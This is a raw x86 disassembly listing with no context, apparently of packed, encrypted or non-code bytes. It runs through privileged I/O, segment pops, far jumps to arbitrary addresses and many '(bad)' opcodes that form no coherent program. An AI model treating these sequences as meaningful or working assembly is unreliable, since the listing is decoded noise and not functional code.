  4396ce:	outs   dx,BYTE PTR ds:[esi]
  4396cf:	fdiv   st,st(7)
  4396d1:	pop    ecx
  4396d2:	sti    
  4396d3:	or     eax,0xba0e00b9
  4396d8:	inc    ebx
  4396d9:	stos   BYTE PTR es:[edi],al
  4396da:	cmp    bh,BYTE PTR [edi-0x216a1a58]
  4396e0:	mov    ebx,eax
  4396e2:	mov    edi,0x6f9c3741
  4396e7:	add    al,0xbe
  4396e9:	add    eax,0x68e663ec
  4396ee:	jg     0x439706
  4396f0:	pop    ebx
  4396f1:	clc    
  4396f2:	popaw  
  4396f4:	pop    ss
  4396f5:	lahf   
  4396f6:	test   BYTE PTR [edi-0x1df1fd96],0xa
  4396fd:	xchg   ax,ax
  4396ff:	jmp    0x4396dc
  439701:	xchg   ecx,eax
  439702:	ins    BYTE PTR es:[edi],dx
  439703:	jae    0x439761
  439705:	sub    eax,DWORD PTR [eax+esi*2+0x5a5c0031]
  43970c:	mov    ds:0xc603d065,al
  439711:	rol    BYTE PTR [edx],cl
  439713:	rcl    BYTE PTR [ebp-0x40bb5305],0xc2
  43971a:	stos   BYTE PTR es:[edi],al
  43971b:	and    edx,ebp
  43971d:	adc    eax,0x54ce35d8
  439722:	cmp    DWORD PTR [ebx+0x3858913e],edi
  439728:	or     bh,cl
  43972a:	xor    eax,DWORD PTR [ebp+0x75]
  43972d:	xchg   edx,eax
  43972e:	pusha  
  43972f:	sub    eax,0x91096260
  439734:	loopne 0x4396f8
  439736:	inc    ebx
  439737:	aam    0xde
  439739:	adc    eax,0x71b4da14
  43973e:	mov    eax,ds:0xe841b130
  439743:	les    ecx,FWORD PTR [eax-0x2582c934]
  439749:	pop    ebp
  43974a:	jb     0x439723
  43974c:	lahf   
  43974d:	pop    edx
  43974e:	pop    es
  43974f:	test   DWORD PTR [edx+eax*8-0x57],edx
  439753:	push   esp
  439754:	outs   dx,DWORD PTR ds:[esi]
  439755:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439756:	gs jg  0x4397b1
  439759:	add    DWORD PTR [ebx],esp
  43975b:	in     al,dx
  43975c:	(bad)  
  43975e:	retf   0xe406
  439761:	add    ah,BYTE PTR [eax+0xb]
  439764:	mov    dh,0x58
  439766:	mov    ds:0x1f71fbcc,al
  43976b:	mov    bh,0xda
  43976d:	xchg   DWORD PTR [eax+0x7a],edi
  439770:	cwde   
  439771:	add    BYTE PTR es:[edx-0x2a22a3b9],bl
  439778:	ins    DWORD PTR es:[edi],dx
  439779:	or     al,BYTE PTR [ebp+0x729277d6]
  43977f:	pop    ds
  439780:	jb     0x4397f1
  439782:	sbb    ah,dl
  439784:	dec    edx
  439785:	lock mov BYTE PTR [edi+ebx*2],al
  439789:	pop    ds
  43978a:	mov    al,0x1c
  43978c:	add    DWORD PTR [ebp-0x78b5423b],ebp
  439792:	push   cs
  439793:	pop    es
  439794:	mov    ch,0xed
  439796:	pop    ebp
  439797:	mov    ebx,0xc966dfc8
  43979c:	repnz retf 0xe48b
  4397a0:	arpl   bp,ax
  4397a2:	mov    esp,0x4a1c47ca
  4397a7:	fcom   st(2)
  4397a9:	retf   0x9cf0
  4397ac:	sbb    ch,cl
  4397ae:	pop    es
  4397af:	mov    esp,0xdf750588
  4397b4:	pop    esp
  4397b5:	and    eax,0x5f99589
  4397ba:	push   esp
  4397bb:	aaa    
  4397bc:	mov    ds:0xabcf2b3f,al
  4397c1:	and    eax,0xf1687d6d
  4397c6:	scas   eax,DWORD PTR es:[edi]
  4397c7:	lahf   
  4397c8:	or     esp,edi
  4397ca:	inc    eax
  4397cb:	xchg   ebp,eax
  4397cc:	js     0x4397bf
  4397ce:	imul   edx,ebp,0x82f0e9c2
  4397d4:	cmp    edi,edi
  4397d6:	fldenv [edi]
  4397d8:	lock popa 
  4397da:	lahf   
  4397db:	aad    0xa9
  4397dd:	inc    edx
  4397de:	cs mov cl,0xea
  4397e1:	sub    eax,0x3d9ad4fb
  4397e6:	pmulhw mm1,QWORD PTR [edx-0x7673e390]
  4397ed:	jne    0x439830
  4397ef:	cmp    eax,0x1686ff6
  4397f4:	xlat   BYTE PTR ds:[ebx]
  4397f5:	add    bl,BYTE PTR [esp-0x3]
  4397f9:	out    dx,al
  4397fa:	add    eax,0x1e7c5f3a
  4397ff:	leave  
  439800:	jno    0x439855
  439802:	js     0x439840
  439804:	sub    dl,BYTE PTR [esi-0x68]
  439807:	aad    0xdf
  439809:	lahf   
  43980a:	and    BYTE PTR [ecx-0x6dff28b9],0x88
  439811:	das    
  439812:	enter  0x426b,0xca
  439816:	scas   al,BYTE PTR es:[edi]
  439817:	fisttp WORD PTR [ecx]
  439819:	add    ecx,DWORD PTR [eax-0xf59f022]
  43981f:	pop    ss
  439820:	(bad)
  439823:	pop    ebx
  439824:	jmp    0x745120d5
  439829:	cld    
  43982a:	push   0xffffffd5
  43982c:	pushw  ds
  43982e:	repz mov bh,BYTE PTR [ebx-0x77e64031]
  439835:	or     eax,0x782c9feb
  43983a:	(bad)
  43983d:	mov    cs,WORD PTR [ecx+0x2f]
  439840:	mov    esp,eax
  439842:	test   eax,0x3f1546e4
  439847:	or     BYTE PTR [ecx+0x1bac22d],0xa9
  43984e:	jns    0x43988d
  439850:	call   0xb318644f
  439855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439856:	cdq    
  439857:	sbb    edi,DWORD PTR [edx-0x484a78ff]
  43985d:	jae    0x439856
  43985f:	pushf  
  439860:	mov    bl,dl
  439862:	jg     0x4397f4
  439864:	pop    esi
  439865:	xor    al,0xe7
  439867:	aad    0x4e
  439869:	imul   bh
  43986b:	push   es
  43986c:	imul   esp,edi,0x9789b1ff
  439872:	adc    eax,0xd7b7847e
  439877:	xchg   ecx,eax
  439878:	imul   BYTE PTR [eax+esi*2]
  43987b:	xchg   BYTE PTR [esi-0x50dc9ff1],ah
  439881:	stc    
  439882:	cmp    al,0x0
  439884:	cmc    
  439885:	popf   
  439886:	add    esp,edx
  439888:	add    eax,0xf26ee1fa
  43988d:	xor    DWORD PTR [ebp+edx*8-0x2612e660],eax
  439894:	mov    ah,0x2d
  439896:	or     eax,DWORD PTR [esi+0x64]
  439899:	xchg   esp,eax
  43989a:	outs   dx,BYTE PTR ds:[esi]
  43989b:	retf   
  43989c:	in     al,dx
  43989d:	sub    edi,ebp
  43989f:	add    ecx,DWORD PTR [eax+0x210b266e]
  4398a5:	add    ebx,DWORD PTR [edx+ecx*1]
  4398a8:	ror    DWORD PTR [ebx+0x15a803b],0x3a
  4398af:	xchg   ebx,eax
  4398b0:	push   0x237d1e3e
  4398b5:	mov    al,ds:0x2a96efe8
  4398ba:	add    dl,bh
  4398bc:	cwde   
  4398bd:	dec    edx
  4398be:	hlt    
  4398bf:	ret    0xefe9
  4398c2:	push   eax
  4398c3:	pop    ebp
  4398c4:	mov    BYTE PTR [ebp+0x367b908e],al
  4398ca:	pushf  
  4398cb:	push   cs
  4398cc:	(bad)  
  4398cd:	add    dl,al
  4398cf:	ins    BYTE PTR es:[edi],dx
  4398d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4398d1:	sti    
  4398d2:	push   es
  4398d3:	ss push esp
  4398d5:	sbb    BYTE PTR [esi],bl
  4398d7:	xor    eax,0x475efe9a
  4398dc:	shr    DWORD PTR [edi-0x57],1
  4398df:	sbb    al,0x40
  4398e1:	das    
  4398e2:	pop    ds
  4398e3:	pop    ss
  4398e4:	cdq    
  4398e5:	push   0xffffffe5
  4398e7:	fidivr DWORD PTR [ecx+0x654960cb]
  4398ed:	dec    esi
  4398ee:	push   0x9cffeaf0
  4398f3:	aam    0x92
  4398f5:	mov    bl,0xb4
  4398f7:	cwde   
  4398f8:	push   eax
  4398f9:	xchg   ecx,eax
  4398fa:	cmp    al,0x41
  4398fc:	pop    esi
  4398fd:	xchg   ecx,eax
  4398fe:	out    0xc,al
  439900:	and    cl,BYTE PTR [ebx+0xf]
  439903:	addr16 ss gs mov bp,0x4e72
  43990a:	fcomp  QWORD PTR fs:[edx-0xb2fa09b]
  439911:	add    eax,0x773090be
  439916:	lahf   
  439917:	adc    dl,ch
  439919:	lds    ebx,FWORD PTR [edi]
  43991b:	(bad)  
  43991c:	xor    al,0x27
  43991e:	mov    ch,0xac
  439920:	pop    esi
  439921:	fucomi st,st(7)
  439923:	les    esi,FWORD PTR [edx+eax*1]
  439926:	pop    edx
  439927:	adc    BYTE PTR [ebp+0x1fafa26e],ah
  43992d:	call   0xa010451
  439932:	mov    dh,0x13
  439934:	sub    al,0x79
  439936:	les    edi,FWORD PTR [ebx+0x1996577c]
  43993c:	leave  
  43993d:	sbb    BYTE PTR [edx+edi*4-0x79],cl
  439941:	cmp    DWORD PTR [ebx-0x69],0x956730ff
  439948:	lds    ecx,FWORD PTR [esi]
  43994a:	mov    cl,BYTE PTR [ebp-0xf05fcc8]
  439950:	pop    es
  439951:	ret    0xec6
  439954:	fbld   TBYTE PTR [eax+0x61]
  439958:	clc    
  439959:	lods   al,BYTE PTR ds:[esi]
  43995a:	aas    
  43995b:	sbb    ecx,edx
  43995d:	icebp  
  43995e:	fild   QWORD PTR [ebp+0x36]
  439961:	std    
  439962:	out    dx,al
  439963:	cwde   
  439964:	ret    0xe982
  439967:	jae    0x439927
  439969:	sbb    edx,ebx
  43996b:	lds    ecx,FWORD PTR [ecx-0x20e19d27]
  439971:	dec    eax
  439972:	nop
  439973:	inc    eax
  439974:	ja     0x439978
  439976:	xor    cl,ch
  439978:	push   edi
  439979:	test   eax,0xe3d68505
  43997e:	add    al,0xd2
  439980:	xchg   ebp,eax
  439981:	mov    bh,0x71
  439983:	push   esp
  439984:	lds    eax,FWORD PTR [edx-0x38]
  439987:	imul   ecx,DWORD PTR [ebp+edx*2-0x52922b6d],0x4c
  43998f:	mov    WORD PTR [ebx-0x76],fs
  439992:	sbb    al,0x80
  439994:	jbe    0x4399e2
  439996:	push   ds
  439997:	repz test DWORD PTR [ebp+0x75],esp
  43999b:	xchg   esp,eax
  43999c:	out    0x30,al
  43999e:	mov    al,ds:0x457b82d5
  4399a3:	pop    esp
  4399a4:	aas    
  4399a5:	pop    esp
  4399a6:	cmp    eax,0x543b8832
  4399ab:	retf   
  4399ac:	and    dl,BYTE PTR [eax+0x2b03e29]
  4399b2:	fiadd  DWORD PTR [edi]
  4399b4:	cmp    DWORD PTR [esi+0x19a422a9],esi
  4399ba:	das    
  4399bb:	arpl   ax,si
  4399bd:	mov    DWORD PTR [edx-0x2c],ebp
  4399c0:	arpl   WORD PTR [ebx+ecx*1+0x9],bx
  4399c4:	ficomp WORD PTR [esi-0x34]
  4399c7:	rol    DWORD PTR [ebp+0x46bf7cd],1
  4399cd:	inc    eax
  4399ce:	lahf   
  4399cf:	or     ah,ch
  4399d1:	mov    ebx,DWORD PTR [edi]
  4399d3:	aaa    
  4399d4:	inc    edx
  4399d5:	ins    DWORD PTR es:[edi],dx
  4399d6:	sub    bl,BYTE PTR [edx-0x41]
  4399d9:	dec    ebx
  4399da:	jbe    0x439a00
  4399dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4399dd:	push   0x10c271f
  4399e2:	or     eax,0x60453777
  4399e7:	in     eax,dx
  4399e8:	mov    ebp,0xb54eedd3
  4399ed:	icebp  
  4399ee:	cmp    BYTE PTR [edi+0x21c5adea],cl
  4399f4:	mov    ah,0xbb
  4399f6:	retf   0x9655
  4399f9:	scas   eax,DWORD PTR es:[edi]
  4399fa:	into   
  4399fb:	test   DWORD PTR [edi],ecx
  4399fd:	imul   edi,DWORD PTR [edx-0xb],0xffffffe4
  439a01:	push   cs
  439a02:	xchg   esp,eax
  439a03:	aad    0xc3
  439a05:	call   0x2626:0x315f282
  439a0c:	mov    cl,0x3
  439a0e:	sbb    dh,BYTE PTR [ebx]
  439a10:	jne    0x4399e0
  439a12:	pusha  
  439a13:	scas   eax,DWORD PTR es:[edi]
  439a14:	mov    bh,0x2d
  439a16:	jmp    0x840d159a
  439a1b:	and    eax,0x651ffd33
  439a20:	leave  
  439a21:	jg     0x4399fe
  439a23:	aam    0x36
  439a25:	mov    ch,0xd
  439a27:	hlt    
  439a28:	mov    BYTE PTR [edi-0x71],al
  439a2b:	adc    eax,0x782d5ed9
  439a30:	dec    edx
  439a31:	dec    eax
  439a32:	(bad)  
  439a33:	dec    ebp
  439a34:	pop    esi
  439a35:	add    edx,DWORD PTR ds:0x325666f9
  439a3b:	xor    al,0x97
  439a3d:	in     eax,0x8d
  439a3f:	add    eax,0xa2f037b
  439a44:	mov    dh,0xab
  439a46:	jmp    0x5d57ed20
  439a4b:	pushf  
  439a4c:	and    DWORD PTR [ebp+0x65966016],eax
  439a52:	sub    eax,0x2182e7d1
  439a57:	mov    dl,0x38
  439a59:	add    dh,BYTE PTR [ebx+0x7d1ba7d4]
  439a5f:	stos   BYTE PTR es:[edi],al
  439a60:	or     al,0x9a
  439a62:	in     al,dx
  439a63:	mov    ds:0x243b5588,al
  439a68:	pop    ebx
  439a69:	mov    eax,ebp
  439a6b:	push   ds
  439a6c:	cdq    
  439a6d:	mov    ch,0x35
  439a6f:	or     DWORD PTR [ecx-0x1e98aafb],0xb
  439a76:	push   0x32a3891a
  439a7b:	mov    al,ds:0x7d7c06e8
  439a80:	out    0xe6,al
  439a82:	push   eax
  439a83:	aad    0x8f
  439a85:	mov    esp,0xc47b42d9
  439a8a:	adc    al,0xfb
  439a8c:	mov    BYTE PTR [edi+0x4db37898],ch
  439a92:	cmp    BYTE PTR [edi+edx*1],bl
  439a95:	adc    eax,0x7e222738
  439a9a:	ret    0x8e97
  439a9d:	sub    BYTE PTR [edi+0x60f8a1cd],al
  439aa3:	cdq    
  439aa4:	ins    DWORD PTR es:[edi],dx
  439aa5:	fadd   st(7),st
  439aa7:	mov    ebx,0xd5cd077c
  439aac:	xchg   ebp,eax
  439aad:	mov    cl,0x74
  439aaf:	je     0x439ac8
  439ab1:	lahf   
  439ab2:	xchg   ebp,eax
  439ab3:	mov    ch,0x97
  439ab5:	and    DWORD PTR [edi+0xe947e3c],edi
  439abb:	mov    ch,0x2a
  439abd:	int    0x93
  439abf:	push   ds
  439ac0:	or     BYTE PTR [ebx+0x36],ch
  439ac3:	mov    eax,ds:0x3795231d
  439ac8:	mov    edi,edi
  439aca:	lods   al,BYTE PTR ds:[esi]
  439acb:	test   al,0xe7
  439acd:	test   al,0x93
  439acf:	push   ebx
  439ad0:	xchg   BYTE PTR ds:0xb29778e3,al
  439ad6:	outs   dx,DWORD PTR ds:[esi]
  439ad7:	mov    ebp,0xdc060244
  439adc:	mov    ah,0x22
  439ade:	add    BYTE PTR [ebx],dl
  439ae0:	mov    al,0xac
  439ae2:	pop    ds
  439ae3:	dec    ebp
  439ae4:	mov    ecx,0xe649d7cc
  439ae9:	lock jb 0x439abd
  439aec:	repz adc eax,0x817e5a04
  439af2:	lahf   
  439af3:	xchg   edi,eax
  439af4:	stos   BYTE PTR es:[edi],al
  439af5:	neg    DWORD PTR [edi]
  439af7:	inc    ebx
  439af8:	sbb    BYTE PTR [edx+esi*1+0x791a495],0xd7
  439b00:	lods   al,BYTE PTR ds:[esi]
  439b01:	fdivrp st(0),st
  439b03:	fldenv [eax+edi*2-0x6a]
  439b07:	xchg   edx,eax
  439b08:	mov    DWORD PTR [edi],edx
  439b0a:	popf   
  439b0b:	cmp    bh,dh
  439b0d:	in     eax,dx
  439b0e:	mov    bh,0x58
  439b10:	pushf  
  439b11:	pop    ds
  439b12:	jle    0x439b84
  439b14:	add    DWORD PTR [eax+eax*1+0xb8f481b],edi
  439b1b:	push   ebx
  439b1c:	mov    BYTE PTR [ecx+0x4a],ah
  439b1f:	test   eax,0xa2b0a075
  439b24:	jmp    0xa711:0xb97d8602
  439b2b:	(bad)  
  439b2c:	fcomi  st,st(6)
  439b2e:	mov    eax,0x5ef25a69
  439b33:	iret   
  439b34:	jno    0x439aba
  439b36:	pop    edi
  439b37:	aam    0x3a
  439b39:	ret    0xf55d
  439b3c:	and    BYTE PTR [ebx],ah
  439b3e:	sbb    dl,bh
  439b40:	xchg   ebx,eax
  439b41:	aaa    
  439b42:	shr    DWORD PTR [ebx+ebp*8+0x79f40459],1
  439b49:	jmp    0xf4be74b1
  439b4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439b4f:	icebp  
  439b50:	inc    esi
  439b51:	sbb    bl,0x8a
  439b54:	mov    al,0x24
  439b56:	jle    0x439b9e
  439b58:	jo     0x439bbd
  439b5a:	lahf   
  439b5b:	mov    ah,0x27
  439b5d:	icebp  
  439b5e:	clc    
  439b5f:	gs xor ah,ch
  439b62:	jg     0x439b39
  439b64:	add    eax,0x3858c83f
  439b69:	xchg   ebx,eax
  439b6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439b6b:	aam    0x8c
  439b6d:	mov    ecx,0x90e6a362
  439b72:	je     0x439b41
  439b74:	clc    
  439b75:	jle    0x439b96
  439b77:	xchg   edi,eax
  439b78:	mov    ds:0x864b23a2,eax
  439b7d:	je     0x439be7
  439b7f:	mov    ecx,0xe2e8e464
  439b84:	enter  0x558d,0x86
  439b88:	xchg   esp,eax
  439b89:	popw   ds
  439b8b:	add    esi,ebx
  439b8d:	jl     0x439bba
  439b8f:	sub    edx,edx
  439b91:	or     ah,BYTE PTR [eax+0x1218b69c]
  439b97:	xlat   BYTE PTR ds:[ebx]
  439b98:	sub    bh,BYTE PTR [ebp-0x599a4f3c]
  439b9e:	pop    ds
  439b9f:	lods   eax,DWORD PTR ds:[esi]
  439ba0:	fcom   DWORD PTR [ecx-0x6b855747]
  439ba6:	jecxz  0x439b7a
  439ba8:	mov    al,0x94
  439baa:	add    BYTE PTR [ecx+0x63],bl
  439bad:	arpl   WORD PTR [edi],di
  439baf:	sub    eax,0xd75b0c71
  439bb4:	imul   edi,DWORD PTR [eax+0x1e],0xcd8e7212
  439bbb:	cdq    
  439bbc:	sahf   
  439bbd:	sbb    al,0xce
  439bbf:	clc    
  439bc0:	push   es
  439bc1:	lock dec esp
  439bc3:	cmp    BYTE PTR [ecx],bh
  439bc5:	mov    ebx,edi
  439bc7:	jae    0x439c25
  439bc9:	out    dx,eax
  439bca:	pop    ds
  439bcb:	das    
  439bcc:	ins    BYTE PTR es:[edi],dx
  439bcd:	mov    ch,0xc7
  439bcf:	aaa    
  439bd0:	and    dh,BYTE PTR [ebx]
  439bd2:	push   cs
  439bd3:	aam    0xcc
  439bd5:	xchg   ecx,eax
  439bd6:	and    eax,0xaf0d2713
  439bdb:	or     BYTE PTR [ecx+0x70c1d665],0xcf
  439be2:	mov    al,ds:0xecf19c97
  439be7:	stos   BYTE PTR es:[edi],al
  439be8:	pop    eax
  439be9:	in     eax,0x53
  439beb:	addr16 loope 0x439bf3
  439bee:	dec    esi
  439bef:	push   DWORD PTR [ebp+0x7bb54ebb]
  439bf5:	mov    esp,0xfa2dc760
  439bfa:	pushf  
  439bfb:	imul   DWORD PTR [edx+0x5d2a7802]
  439c01:	jbe    0x439bbe
  439c03:	imul   eax,DWORD PTR [ecx+ecx*2-0xda600d7],0x8951c560
  439c0e:	inc    esp
  439c0f:	inc    ecx
  439c10:	xchg   esp,eax
  439c11:	jge    0x439c68
  439c13:	aam    0x61
  439c15:	jge    0x439bae
  439c17:	and    eax,0x40e7af2c
  439c1c:	icebp  
  439c1d:	in     eax,dx
  439c1e:	pop    es
  439c1f:	jl     0x439beb
  439c21:	test   BYTE PTR [edi],bl
  439c23:	sub    DWORD PTR [ecx-0x2b],0x2121f47
  439c2a:	jp     0x439bd3
  439c2c:	adc    eax,0x7199cd0c
  439c31:	inc    edi
  439c32:	push   ds
  439c33:	adc    eax,0x60d7a1dc
  439c38:	pop    esp
  439c39:	aad    0x2
  439c3b:	scas   eax,DWORD PTR es:[edi]
  439c3c:	iret   
  439c3d:	mov    edx,0x5fbb855
  439c42:	test   eax,0x1f94eb84
  439c47:	(bad)  
  439c48:	in     al,dx
  439c49:	dec    ebp
  439c4a:	sub    esi,DWORD PTR [edx-0x73]
  439c4d:	pushf  
  439c4e:	push   ebx
  439c4f:	pop    eax
  439c50:	daa    
  439c51:	in     al,dx
  439c52:	pusha  
  439c53:	(bad)  
  439c54:	in     eax,0x12
  439c56:	mov    bh,BYTE PTR [ebx-0x41]
  439c59:	popf   
  439c5a:	pusha  
  439c5b:	loope  0x439c80
  439c5d:	jp     0x439c3a
  439c5f:	inc    esp
  439c60:	push   edx
  439c61:	les    esi,FWORD PTR [edx-0xee5792c]
  439c67:	xchg   ebp,eax
  439c68:	adc    ecx,DWORD PTR [ecx+0x71]
  439c6b:	sbb    bh,cl
  439c6d:	push   es
  439c6e:	cwde   
  439c6f:	shl    DWORD PTR [ebx+0x2],cl
  439c72:	loopne 0x439c28
  439c74:	push   ebp
  439c75:	(bad)  
  439c76:	and    eax,0x526760e6
  439c7b:	(bad)  
  439c7d:	add    BYTE PTR [esi-0x5b858ba6],dh
  439c83:	and    eax,0xa71f1564
  439c88:	mov    ch,0x60
  439c8a:	repz test BYTE PTR [eax],ah
  439c8d:	inc    ecx
  439c8e:	enter  0x44ba,0xdb
  439c92:	push   ecx
  439c93:	mov    ecx,0xddf35709
  439c98:	or     esp,DWORD PTR [esi+ebx*1]
  439c9b:	jnp    0x439ce5
  439c9d:	retf   
  439c9e:	adc    DWORD PTR [edi],edi
  439ca0:	mov    edi,DWORD PTR [edi+ebx*1]
  439ca3:	inc    esi
  439ca4:	jecxz  0x439cbe
  439ca6:	push   ds
  439ca7:	mov    WORD PTR [ebx],es
  439ca9:	mov    dh,0xd6
  439cab:	test   al,0xcb
  439cad:	in     eax,dx
  439cae:	adc    eax,0xfb8f884c
  439cb3:	nop
  439cb4:	mov    dl,0x75
  439cb6:	repnz or eax,0xb9d00599
  439cbc:	mov    dl,0xe
  439cbe:	xchg   ebx,eax
  439cbf:	ins    DWORD PTR es:[edi],dx
  439cc0:	cmp    eax,0xb0ad1f42
  439cc5:	pop    esp
  439cc6:	(bad)  
  439cc7:	in     al,0xac
  439cc9:	xor    ecx,0xfffffffc
  439ccc:	je     0x439cc5
  439cce:	rcl    esp,cl
  439cd0:	mov    es,WORD PTR [ecx]
  439cd2:	int    0x5
  439cd4:	call   0x8952b689
  439cd9:	mov    ds:0x8358fbda,eax
  439cde:	sbb    dh,BYTE PTR [esi+ebx*4]
  439ce1:	jno    0x439d0f
  439ce3:	xor    ecx,DWORD PTR [ecx+0xc73451f]
  439ce9:	out    dx,eax
  439cea:	ror    BYTE PTR [esi-0x178c0477],1
  439cf0:	sbb    DWORD PTR [ecx],eax
  439cf2:	les    edi,FWORD PTR [edi-0x3b]
  439cf5:	and    eax,ebx
  439cf7:	mov    edi,0x786024f
  439cfc:	ds js  0x439d51
  439cff:	jb     0x439c89
  439d01:	repz dec esi
  439d03:	add    BYTE PTR [ebx+0x1a0417e5],0xd
  439d0a:	fcomp  st(6)
  439d0c:	pop    edx
  439d0d:	mov    cl,BYTE PTR [ecx-0x5626687a]
  439d13:	test   DWORD PTR [esi],esi
  439d15:	add    cl,ch
  439d17:	rcl    DWORD PTR [edi+0x701cd713],0xbe
  439d1e:	pusha  
  439d1f:	pop    ss
  439d20:	ja     0x439d0a
  439d22:	sahf   
  439d23:	push   ecx
  439d24:	clc    
  439d25:	aad    0x51
  439d27:	sahf   
  439d28:	nop
  439d29:	cs dec ecx
  439d2b:	fmul   DWORD PTR [ecx+0x5b439489]
  439d31:	sbb    DWORD PTR [edx],0xffffffb3
  439d34:	mov    ebx,ebp
  439d36:	add    esi,DWORD PTR [ecx+0x7d]
  439d39:	sub    al,0x2d
  439d3b:	xor    BYTE PTR [eax],bh
  439d3d:	sbb    DWORD PTR [ecx-0x2c],eax
  439d40:	iret   
  439d41:	xchg   DWORD PTR [edx+0x41],ebp
  439d44:	(bad)  [edx]
  439d46:	imul   ecx,DWORD PTR [ecx],0xffffff97
  439d49:	jae    0x439d99
  439d4b:	test   DWORD PTR [ebx-0x3d7d1dbe],0x46d56f22
  439d55:	call   0xcfed6ef9
  439d5a:	out    dx,al
  439d5b:	jecxz  0x439d32
  439d5d:	xchg   ecx,eax
  439d5e:	mov    BYTE PTR [eax],dl
  439d60:	mov    DWORD PTR [ecx],ebp
  439d62:	js     0x439d72
  439d64:	fisttp DWORD PTR [edi+0x21af671]
  439d6a:	mov    edx,0xbc522c62
  439d6f:	cwde   
  439d70:	pusha  
  439d71:	jle    0x439d92
  439d73:	adc    esp,DWORD PTR [eax-0x4e943bac]
  439d79:	mul    DWORD PTR [eax]
  439d7b:	pop    ebp
  439d7c:	or     eax,0x85971fde
  439d81:	add    dh,BYTE PTR [edi+0x6ec9c84b]
  439d87:	jmp    0x439df1
  439d89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439d8a:	icebp  
  439d8b:	cmp    cl,BYTE PTR [ecx-0x80]
  439d8e:	gs pop edx
  439d90:	iret   
  439d91:	add    dh,BYTE PTR [esi]
  439d93:	shr    BYTE PTR ds:0xd9eb28f9,0xb3
  439d9a:	pop    ds
  439d9b:	in     eax,0x55
  439d9d:	ret    0xeb50
  439da0:	adc    al,0xb5
  439da2:	jno    0x439d79
  439da4:	ror    cl,cl
  439da6:	jnp    0x439dc0
  439da8:	xor    DWORD PTR [ecx+0x51f6ee89],0xa7d6d59e
  439db2:	scas   eax,DWORD PTR es:[edi]
  439db3:	mov    BYTE PTR [eax+0x13],al
  439db6:	imul   edx,ebp,0x15905c22
  439dbc:	imul   ebp,ebp,0x2188679d
  439dc2:	mov    BYTE PTR [ecx],dh
  439dc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439dc5:	ret    
  439dc6:	and    ah,al
  439dc8:	stos   BYTE PTR es:[edi],al
  439dc9:	add    eax,0xb7b09a88
  439dce:	xchg   edi,ebp
  439dd0:	add    eax,0xd1756092
  439dd5:	enter  0xe40c,0x60
  439dd9:	lgs    ecx,FWORD PTR es:[ecx]
  439ddd:	hlt    
  439dde:	add    ebp,0xffffff88
  439de1:	call   0x42b4fd58
  439de6:	pop    ds
  439de7:	lea    ecx,[ecx+0x37]
  439dea:	or     al,dh
  439dec:	push   cs
  439ded:	scas   eax,DWORD PTR es:[edi]
  439dee:	xchg   ebp,eax
  439def:	hlt    
  439df0:	pop    ss
  439df1:	add    edi,DWORD PTR [ebx+edx*2-0x6f]
  439df5:	sbb    DWORD PTR ds:0x7d8560ae,edx
  439dfb:	aas    
  439dfc:	xlat   BYTE PTR ds:[ebx]
  439dfd:	dec    eax
  439dfe:	xor    DWORD PTR [ecx],ebp
  439e00:	cmc    
  439e01:	or     DWORD PTR [edi],ebx
  439e03:	mul    al
  439e05:	mov    eax,ds:0x2c36d0bb
  439e0a:	std    
  439e0b:	retf   
  439e0c:	dec    ebp
  439e0d:	fsub   QWORD PTR [eax]
  439e0f:	lods   eax,DWORD PTR ds:[esi]
  439e10:	and    eax,0x8d1d1e6f
  439e15:	dec    edx
  439e16:	jl     0x439da7
  439e18:	push   ss
  439e19:	jae    0x439da0
  439e1b:	int3   
  439e1c:	bound  eax,QWORD PTR [edx]
  439e1e:	inc    esi
  439e1f:	sbb    dl,BYTE PTR [ebp+0x1a]
  439e22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439e23:	push   esi
  439e24:	es lock jbe 0x439dc3
  439e28:	loop   0x439e27
  439e2a:	daa    
  439e2b:	xlat   BYTE PTR ds:[ebx]
  439e2c:	cmp    BYTE PTR [ebx-0x29390cf6],bl
  439e32:	adc    ah,ah
  439e34:	clc    
  439e35:	jno    0x439e8b
  439e37:	pop    ebx
  439e38:	fwait
  439e39:	call   0x4cd2c43
  439e3e:	jmp    FWORD PTR [edx+0x57]
  439e41:	neg    BYTE PTR [ecx+0x5aac7]
  439e47:	mov    eax,ds:0x1ddd516e
  439e4c:	retf   0x7405
  439e4f:	iret   
  439e50:	iret   
  439e51:	push   esi
  439e52:	push   0xb9918173
  439e57:	cmp    eax,0xd5c1fa4c
  439e5c:	sub    DWORD PTR [esi-0x656a40a],eax
  439e62:	pop    esi
  439e63:	push   eax
  439e65:	jns    0x439e4a
  439e67:	xor    ecx,esp
  439e69:	cmp    bh,BYTE PTR [ebx+0x54]
  439e6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439e6d:	push   ebp
  439e6e:	not    ebx
  439e70:	xchg   ebp,edx
  439e72:	adc    DWORD PTR [eax-0x49],ebx
  439e75:	popf   
  439e76:	shl    BYTE PTR [ebx+ebp*2],1
  439e79:	sbb    BYTE PTR [esi],bl
  439e7b:	xor    eax,0xab146826
  439e80:	push   esp
  439e81:	stc    
  439e82:	mov    esp,edx
  439e84:	push   ss
  439e85:	mov    DWORD PTR [ecx-0x73],eax
  439e88:	push   cs
  439e89:	sub    DWORD PTR [esi],esi
  439e8b:	mov    ecx,DWORD PTR [ecx+0x1ac32eb3]
  439e91:	jne    0x439ee8
  439e93:	cmp    eax,0x85000384
  439e98:	cmp    DWORD PTR [esi],ecx
  439e9a:	call   0xf0ee9273
  439e9f:	jp     0x439e29
  439ea1:	popa   
  439ea2:	ret    0x70ae
  439ea5:	sahf   
  439ea6:	lods   al,BYTE PTR ds:[esi]
  439ea7:	dec    edi
  439ea8:	jp     0x439ead
  439eaa:	bound  ebp,QWORD PTR [esi]
  439eac:	or     ebp,0xf2c33aff
  439eb2:	pop    ds
  439eb3:	jg     0x439e4b
  439eb5:	mov    ?,ecx
  439eb7:	mov    ebx,0xd425e2d4
  439ebc:	cmp    dh,BYTE PTR [edx-0x1abbb811]
  439ec2:	sbb    al,BYTE PTR [edx-0x5458ee4c]
  439ec8:	mov    ecx,DWORD PTR [ebp-0x122d2835]
